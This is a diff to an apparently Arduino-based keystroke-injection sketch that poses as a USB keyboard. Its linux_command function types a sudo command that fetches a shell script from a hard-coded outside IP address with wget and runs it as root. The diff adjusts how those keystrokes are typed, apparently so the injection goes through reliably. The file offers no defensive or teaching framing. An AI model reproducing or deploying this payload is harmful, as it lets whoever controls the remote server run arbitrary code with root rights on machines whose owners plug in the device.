@@ -109,17 +109,29 @@ void windows_command(char arg1[]){
 }
 
 void linux_command(){
-  Keyboard.press(KEY_LEFT_CTRL);
+  /*Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press('t');
-  Keyboard.releaseAll();
+  Keyboard.releaseAll();*/
 
   delay(1000);
-  Keyboard.print("sudo bash -c \"$(wget -q 0 -O - http://35.212.247.53/runsh.sh)\"");
-  delay(10000);
+  Keyboard.print("sudo bash -c ");
+  delay(1);
+  Keyboard.write('"');
+  Keyboard.write('$');
+  Keyboard.write('(');
+  delay(1);
+  Keyboard.print("wget -q 0 -O - http://35.212.247.53/runsh.sh");
+  delay(1);
+  Keyboard.write(')');
+  Keyboard.write('"');
+  
   Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
+  delay(10000);
   Keyboard.print("exit");
   Keyboard.press(KEY_RETURN);
+  Keyboard.releaseAll();
 }
 
 void loop() {
